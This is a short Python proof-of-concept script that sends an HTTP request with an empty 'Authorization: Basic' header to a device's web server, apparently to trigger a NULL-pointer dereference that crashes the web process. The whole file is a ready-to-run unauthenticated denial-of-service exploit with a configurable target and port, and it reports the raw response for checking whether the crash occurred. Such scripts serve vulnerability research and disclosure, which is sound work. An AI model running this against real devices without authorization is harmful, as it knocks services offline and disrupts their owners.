#!/usr/bin/env python3
import argparse
import json
import socket
import ssl


def main():
    parser = argparse.ArgumentParser(description='Unauthenticated NULL-pointer dereference in Authorization parsing')
    parser.add_argument('--target', default='192.168.229.1')
    parser.add_argument('--port', type=int, default=80)
    args = parser.parse_args()
    request = 'GET / HTTP/1.1\r\nHost: {host}\r\nAuthorization: Basic\r\nConnection: close\r\n\r\n'.format(host=args.target).encode()
    response = b''
    error = ''
    try:
        with socket.create_connection((args.target, args.port), timeout=5) as raw:
            if False:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                stream = context.wrap_socket(raw, server_hostname=args.target)
            else:
                stream = raw
            with stream:
                stream.settimeout(8)
                stream.sendall(request)
                response = stream.recv(4096)
    except Exception as exc:
        error = repr(exc)
    print(json.dumps({'response_hex': response.hex(), 'error': error,
                      'note': 'Confirm the documented fatal signal in the device log and Web-process availability.'}, indent=2))


if __name__ == '__main__':
    main()
